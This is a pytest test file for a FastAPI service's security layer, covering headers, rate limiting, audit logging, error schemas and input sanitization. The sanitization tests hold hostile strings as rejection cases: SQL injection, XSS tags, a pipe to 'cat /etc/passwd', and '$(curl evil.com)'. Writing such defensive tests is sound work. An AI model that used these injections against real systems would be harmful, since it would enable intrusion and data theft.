"""
Unit Tests for Security Validation (api/security.py + api/sanitizer.py)
Tests: rate limiting, headers, audit logging, sanitization, bot detection
"""

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

import pytest
import json
import time
from unittest.mock import patch, MagicMock, AsyncMock
from fastapi.testclient import TestClient

from api.main import app


@pytest.fixture(scope="module")
def client():
    with TestClient(app, raise_server_exceptions=False) as c:
        yield c


# =============================================================================
# Security Headers
# =============================================================================

class TestSecurityHeaders:
    def test_root_has_x_content_type_options(self, client):
        response = client.get("/")
        assert response.status_code == 200
        assert response.headers.get("x-content-type-options") == "nosniff"

    def test_root_has_x_frame_options(self, client):
        response = client.get("/")
        assert response.headers.get("x-frame-options") == "DENY"

    def test_root_has_xss_protection(self, client):
        response = client.get("/")
        assert "x-xss-protection" in response.headers

    def test_root_has_referrer_policy(self, client):
        response = client.get("/")
        assert "referrer-policy" in response.headers

    def test_root_has_hsts_header(self, client):
        response = client.get("/")
        assert "strict-transport-security" in response.headers

    def test_root_has_csp_header(self, client):
        response = client.get("/")
        assert "content-security-policy" in response.headers

    def test_root_has_process_time_header(self, client):
        response = client.get("/")
        assert "x-process-time-ms" in response.headers

    def test_root_has_x_download_options(self, client):
        response = client.get("/")
        assert response.headers.get("x-download-options") == "noopen"

    def test_root_has_x_permitted_cross_domain_policies(self, client):
        response = client.get("/")
        val = response.headers.get("x-permitted-cross-domain-policies", "")
        assert val == "none"

    def test_csp_contains_base_uri_restriction(self, client):
        response = client.get("/")
        csp = response.headers.get("content-security-policy", "")
        assert "base-uri" in csp

    def test_csp_contains_frame_ancestors_none(self, client):
        response = client.get("/")
        csp = response.headers.get("content-security-policy", "")
        assert "frame-ancestors" in csp


# =============================================================================
# Rate Limiting
# =============================================================================

class TestRateLimiting:
    def test_rate_limit_anonymous_allowed(self, client):
        with patch("api.security.rate_limiter") as mock_limiter:
            mock_limiter.check.return_value = (True, 15, 60, "anonymous")
            response = client.get("/metrics")
        assert response.status_code == 200

    def test_rate_limit_exceeded_returns_429(self, client):
        with patch("api.security.rate_limiter") as mock_limiter:
            mock_limiter.check.return_value = (False, 0, 30, "anonymous")
            mock_limiter.format_rate_limit_response = lambda *a, **kw: {
                "error": "Rate limit exceeded"
            }
            response = client.get("/metrics")
        assert response.status_code == 429

    def test_rate_limit_premium_tier_allowed(self, client):
        with patch("api.security.rate_limiter") as mock_limiter:
            mock_limiter.check.return_value = (True, 95, 60, "api_key")
            response = client.get("/metrics")
        assert response.status_code == 200

    def test_rate_limit_health_endpoint_not_rate_limited(self, client):
        # Health endpoint is excluded from rate limiting
        response = client.get("/health")
        assert response.status_code == 200


# =============================================================================
# Input Sanitization
# =============================================================================

class TestInputSanitization:
    def test_sanitize_rejects_sql_injection(self):
        from api.sanitizer import validate_and_sanitize
        from fastapi import HTTPException

        with pytest.raises(HTTPException) as exc_info:
            validate_and_sanitize("test'; DROP TABLE users; --", {})
        assert exc_info.value.status_code == 400

    def test_sanitize_rejects_union_select(self):
        from api.sanitizer import validate_and_sanitize
        from fastapi import HTTPException

        with pytest.raises(HTTPException) as exc_info:
            validate_and_sanitize("test' UNION SELECT password FROM users--", {})
        assert exc_info.value.status_code == 400

    def test_sanitize_rejects_or_1_equals_1(self):
        from api.sanitizer import validate_and_sanitize
        from fastapi import HTTPException

        with pytest.raises(HTTPException) as exc_info:
            validate_and_sanitize("test' OR '1'='1", {})
        assert exc_info.value.status_code == 400

    def test_sanitize_rejects_drop_table(self):
        from api.sanitizer import validate_and_sanitize
        from fastapi import HTTPException

        with pytest.raises(HTTPException) as exc_info:
            validate_and_sanitize("DROP TABLE users", {})
        assert exc_info.value.status_code == 400

    def test_sanitize_rejects_script_tags(self):
        from api.sanitizer import validate_and_sanitize
        from fastapi import HTTPException

        with pytest.raises(HTTPException) as exc_info:
            validate_and_sanitize("<script>alert('xss')</script>", {})
        assert exc_info.value.status_code == 400

    def test_sanitize_rejects_javascript_protocol(self):
        from api.sanitizer import validate_and_sanitize
        from fastapi import HTTPException

        with pytest.raises(HTTPException) as exc_info:
            validate_and_sanitize("javascript:alert(1)", {})
        assert exc_info.value.status_code == 400

    def test_sanitize_rejects_onerror_handler(self):
        from api.sanitizer import validate_and_sanitize
        from fastapi import HTTPException

        with pytest.raises(HTTPException) as exc_info:
            validate_and_sanitize("<img onerror=alert(1)>", {})
        assert exc_info.value.status_code == 400

    def test_sanitize_rejects_iframe_tag(self):
        from api.sanitizer import validate_and_sanitize
        from fastapi import HTTPException

        with pytest.raises(HTTPException) as exc_info:
            validate_and_sanitize("<iframe src='evil.com'>", {})
        assert exc_info.value.status_code == 400

    def test_sanitize_rejects_command_injection_semicolon(self):
        from api.sanitizer import validate_and_sanitize
        from fastapi import HTTPException

        with pytest.raises(HTTPException) as exc_info:
            validate_and_sanitize("test; ls", {})
        assert exc_info.value.status_code == 400

    def test_sanitize_rejects_command_injection_pipe(self):
        from api.sanitizer import validate_and_sanitize
        from fastapi import HTTPException

        with pytest.raises(HTTPException) as exc_info:
            validate_and_sanitize("test|cat /etc/passwd", {})
        assert exc_info.value.status_code == 400

    def test_sanitize_rejects_backtick_substitution(self):
        from api.sanitizer import validate_and_sanitize
        from fastapi import HTTPException

        with pytest.raises(HTTPException) as exc_info:
            validate_and_sanitize("`whoami`", {})
        assert exc_info.value.status_code == 400

    def test_sanitize_rejects_dollar_paren_substitution(self):
        from api.sanitizer import validate_and_sanitize
        from fastapi import HTTPException

        with pytest.raises(HTTPException) as exc_info:
            validate_and_sanitize("$(curl evil.com)", {})
        assert exc_info.value.status_code == 400

    def test_sanitize_strips_html_tags(self):
        from api.sanitizer import InputSanitizer

        result = InputSanitizer._strip_html("<b>Hello</b> <script>World</script>")
        assert "<b>" not in result
        assert "<script>" not in result
        assert "Hello" in result
        assert "World" in result

    def test_sanitize_strips_html_entities(self):
        from api.sanitizer import InputSanitizer

        result = InputSanitizer._strip_html("Hello& World")
        assert "&" not in result

    def test_sanitize_normal_indonesian_query_allowed(self):
        from api.sanitizer import validate_and_sanitize

        query, options = validate_and_sanitize(
            "Apa syarat membuat KTP elektronik di Jakarta?",
            {}
        )
        assert len(query) > 0
        assert "KTP" in query

    def test_sanitize_strips_excess_whitespace(self):
        from api.sanitizer import validate_and_sanitize

        query, options = validate_and_sanitize(
            "   Apa   itu    KTP?    ", {}
        )
        assert query == query.strip()

    def test_sanitize_trims_query_length(self):
        from api.sanitizer import validate_and_sanitize
        from fastapi import HTTPException

        # Query too long (>500 chars)
        long_query = "a" * 600
        with pytest.raises(HTTPException) as exc_info:
            validate_and_sanitize(long_query, {})
        assert exc_info.value.status_code == 400

    def test_sanitize_rejects_query_too_short(self):
        from api.sanitizer import validate_and_sanitize
        from fastapi import HTTPException

        with pytest.raises(HTTPException) as exc_info:
            validate_and_sanitize("a", {})  # < 2 chars
        assert exc_info.value.status_code == 400

    def test_sanitize_rejects_non_string(self):
        from api.sanitizer import validate_and_sanitize
        from fastapi import HTTPException

        with pytest.raises(HTTPException) as exc_info:
            validate_and_sanitize(123, {})
        assert exc_info.value.status_code == 400

    def test_sanitize_options_valid_top_k(self):
        from api.sanitizer import validate_and_sanitize

        _, options = validate_and_sanitize("Test query", {"top_k": 10})
        assert options["top_k"] == 10

    def test_sanitize_options_invalid_top_k_rejected(self):
        from api.sanitizer import validate_and_sanitize
        from fastapi import HTTPException

        with pytest.raises(HTTPException):
            validate_and_sanitize("Test", {"top_k": 100})  # > 20

    def test_sanitize_options_converts_boolean(self):
        from api.sanitizer import validate_and_sanitize

        _, options = validate_and_sanitize(
            "Test",
            {"use_hybrid": "true", "use_reranking": 1}
        )
        assert options["use_hybrid"] is True
        assert options["use_reranking"] is True

    def test_sanitize_options_filters_unknown_keys(self):
        from api.sanitizer import validate_and_sanitize

        _, options = validate_and_sanitize(
            "Test",
            {"top_k": 5, "unknown_key": "value"}
        )
        assert "unknown_key" not in options

    def test_sanitize_doc_id_valid(self):
        from api.sanitizer import InputSanitizer

        result = InputSanitizer.sanitize_document_id("perpres_26_2009")
        assert result == "perpres_26_2009"

    def test_sanitize_doc_id_invalid_chars(self):
        from api.sanitizer import InputSanitizer
        from fastapi import HTTPException

        with pytest.raises(HTTPException):
            InputSanitizer.sanitize_document_id("doc with spaces")

    def test_sanitize_doc_id_too_long(self):
        from api.sanitizer import InputSanitizer
        from fastapi import HTTPException

        with pytest.raises(HTTPException):
            InputSanitizer.sanitize_document_id("a" * 250)


# =============================================================================
# Audit Logging
# =============================================================================

class TestAuditLogging:
    def test_audit_log_function_exists(self):
        from api.security import audit_log
        assert callable(audit_log)

    def test_audit_log_accepts_dict(self):
        from api.security import audit_log

        entry = {
            "event": "test_event",
            "method": "GET",
            "path": "/test",
            "client_ip": "127.0.0.1",
        }
        # Should not raise
        audit_log(entry)

    def test_audit_log_injection_attempt_logged(self, client):
        with patch("api.security.audit_log") as mock_audit:
            # Trigger audit via request
            client.get("/")
 # Audit should be called on request
        assert mock_audit.called


# =============================================================================
# Rate Limiter Unit Tests
# =============================================================================

class TestRateLimiterUnit:
    def test_rate_limiter_initialization(self):
        from api.rate_limiter import TieredRateLimiter

        limiter = TieredRateLimiter()
        assert limiter.IP_LIMIT == 20
        assert limiter.USER_LIMIT == 100
        assert limiter.API_KEY_LIMIT == 200

    def test_rate_limiter_anonymous_first_request_allowed(self):
        from api.rate_limiter import TieredRateLimiter

        limiter = TieredRateLimiter()
        allowed, remaining, reset_in, tier = limiter.check("192.168.1.1")
        assert allowed is True
        assert tier == "anonymous"

    def test_rate_limiter_anonymous_limit_exceeded(self):
        from api.rate_limiter import TieredRateLimiter

        limiter = TieredRateLimiter()
        # Make 20 requests (IP_LIMIT = 20) to the same IP
        for i in range(20):
            allowed, remaining, reset_in, tier = limiter.check("192.168.1.1")
        # 21st request from same IP should be blocked
        allowed, remaining, reset_in, tier = limiter.check("192.168.1.1")
        assert allowed is False
        assert tier == "anonymous"

    def test_rate_limiter_authenticated_higher_limit(self):
        from api.rate_limiter import TieredRateLimiter

        limiter = TieredRateLimiter()
        # Make 100 requests (USER_LIMIT = 100) to the same user
        for i in range(100):
            allowed, remaining, reset_in, tier = limiter.check(
                "192.168.1.1", user_id="user_123"
            )
        # 101st should be blocked
        allowed, remaining, reset_in, tier = limiter.check(
            "192.168.1.1", user_id="user_123"
        )
        assert allowed is False
        assert tier == "authenticated"

    def test_rate_limiter_api_key_highest_limit(self):
        from api.rate_limiter import TieredRateLimiter

        limiter = TieredRateLimiter()
        # Make 200 requests (API_KEY_LIMIT = 200) to the same API key
        for i in range(200):
            allowed, remaining, reset_in, tier = limiter.check(
                "10.0.0.1", api_key="key_123"
            )
        # 201st should be blocked
        allowed, remaining, reset_in, tier = limiter.check(
            "10.0.0.1", api_key="key_123"
        )
        assert allowed is False
        assert tier == "api_key"

    def test_rate_limiter_get_stats(self):
        from api.rate_limiter import TieredRateLimiter

        limiter = TieredRateLimiter()
        limiter.check("10.0.0.5")
        stats = limiter.get_stats("10.0.0.5")
        assert stats["tier"] == "anonymous"
        assert "used" in stats
        assert "limit" in stats
        assert "remaining" in stats

    def test_rate_limiter_format_response(self):
        from api.rate_limiter import format_rate_limit_response

        resp = format_rate_limit_response("anonymous", 0, 30, 20)
        assert resp["error"] == "Rate limit exceeded"
        assert resp["retry_after"] == 30
        assert resp["rate_limit"]["tier"] == "anonymous"


# =============================================================================
# Error Schemas
# =============================================================================

class TestErrorSchemas:
    def test_error_type_enum_values(self):
        from src.errors.schemas import ErrorType

        assert ErrorType.DOCUMENT_NOT_FOUND.value == "DOCUMENT_NOT_FOUND"
        assert ErrorType.LLM_TIMEOUT.value == "LLM_TIMEOUT"
        assert ErrorType.RATE_LIMITED.value == "RATE_LIMITED"
        assert ErrorType.INVALID_QUERY.value == "INVALID_QUERY"
        assert ErrorType.RETRIEVAL_FAILED.value == "RETRIEVAL_FAILED"

    def test_get_error_response_returns_error_response(self):
        from src.errors.schemas import get_error_response, ErrorType

        err = get_error_response(ErrorType.RATE_LIMITED, query="test query")
        assert err.code == "RATE001"
        assert err.recoverable is True

    def test_get_error_response_with_query(self):
        from src.errors.schemas import get_error_response, ErrorType

        err = get_error_response(ErrorType.INVALID_QUERY, query="test")
        assert err.query == "test"
        assert err.timestamp > 0

    def test_create_error_response_custom_message(self):
        from src.errors.schemas import create_error_response, ErrorType

        err = create_error_response(
            ErrorType.RETRIEVAL_FAILED,
            message="Custom error message.",
            recoverable=False,
        )
        assert err.message == "Custom error message."
        assert err.recoverable is False

    def test_error_response_to_api_response(self):
        from src.errors.schemas import get_error_response, ErrorType

        err = get_error_response(ErrorType.DOCUMENT_NOT_FOUND)
        api = err.to_api_response()
        assert api["success"] is False
        assert "error" in api
        assert "code" in api["error"]
        assert "suggestions" in api["error"]

    def test_check_confidence_warnings_low(self):
        from src.errors.schemas import check_confidence_warnings

        warnings = check_confidence_warnings(0.15)
        assert len(warnings) > 0

    def test_check_confidence_warnings_high(self):
        from src.errors.schemas import check_confidence_warnings

        warnings = check_confidence_warnings(0.8)
        assert len(warnings) == 0

    def test_check_chunk_count_warning_empty(self):
        from src.errors.schemas import check_chunk_count_warning

        warning = check_chunk_count_warning([])
        assert warning is not None
        assert len(warning) > 0

    def test_check_chunk_count_warning_with_chunks(self):
        from src.errors.schemas import check_chunk_count_warning

        warning = check_chunk_count_warning([{"text": "a"}, {"text": "b"}])
        assert warning is None

    def test_check_superseded_document(self):
        from src.errors.schemas import check_superseded_document, SUPERSEDED_WARNING_BANNER

        sources = [{"doc_id": "doc1", "metadata": {"status": "superseded"}}]
        warning = check_superseded_document(sources)
        assert warning == SUPERSEDED_WARNING_BANNER

    def test_check_superseded_document_current(self):
        from src.errors.schemas import check_superseded_document

        sources = [{"doc_id": "doc1", "metadata": {"status": "active"}}]
        warning = check_superseded_document(sources)
        assert warning is None

    def test_create_success_response(self):
        from src.errors.schemas import create_success_response

        resp = create_success_response(
            answer="Jawaban.",
            sources=["Perpres_26_2009"],
            confidence=0.92,
            latency_ms=150.5,
            metadata={"chunks_retrieved": 5},
            warnings=["Test warning"],
        )
        assert resp["success"] is True
        assert resp["answer"] == "Jawaban."
        assert "warnings" in resp

    def test_create_fallback_response(self):
        from src.errors.schemas import create_fallback_response, ErrorType

        resp = create_fallback_response(
            original_error=ErrorType.LLM_TIMEOUT,
            bm25_answer="Basic search answer.",
            chunks=[{"text": "doc1"}, {"text": "doc2"}],
            query="test",
        )
        assert resp["success"] is True
        assert resp["confidence"] == 0.0
        assert resp["metadata"]["fallback_mode"] is True
        assert len(resp["warnings"]) >= 1


# =============================================================================
# Security Middleware Functions
# =============================================================================

class TestSecurityMiddlewareFunctions:
    def test_security_headers_middleware_adds_headers(self):
        from api.security import security_headers_middleware

        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_response.headers = MagicMock()
        mock_call_next = AsyncMock(return_value=mock_response)
        mock_request = MagicMock()

        import asyncio

        result = asyncio.run(security_headers_middleware(mock_request, mock_call_next))
        mock_call_next.assert_called_once()
        assert hasattr(result, "headers")

    def test_rate_limit_middleware_skips_health(self):
        from api.security import rate_limit_middleware

        mock_request = MagicMock()
        mock_request.url.path = "/health"
        mock_request.client.host = "127.0.0.1"
        mock_call_next = AsyncMock(return_value=MagicMock(status_code=200))

        import asyncio

        result = asyncio.run(rate_limit_middleware(mock_request, mock_call_next))
        mock_call_next.assert_called_once()

    def test_log_request_middleware(self):
        from api.security import log_request

        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_call_next = AsyncMock(return_value=mock_response)
        mock_request = MagicMock()
        mock_request.method = "GET"
        mock_request.url.path = "/metrics"
        mock_request.client.host = "127.0.0.1"

        import asyncio

        result = asyncio.run(log_request(mock_request, mock_call_next))
        mock_call_next.assert_called_once()
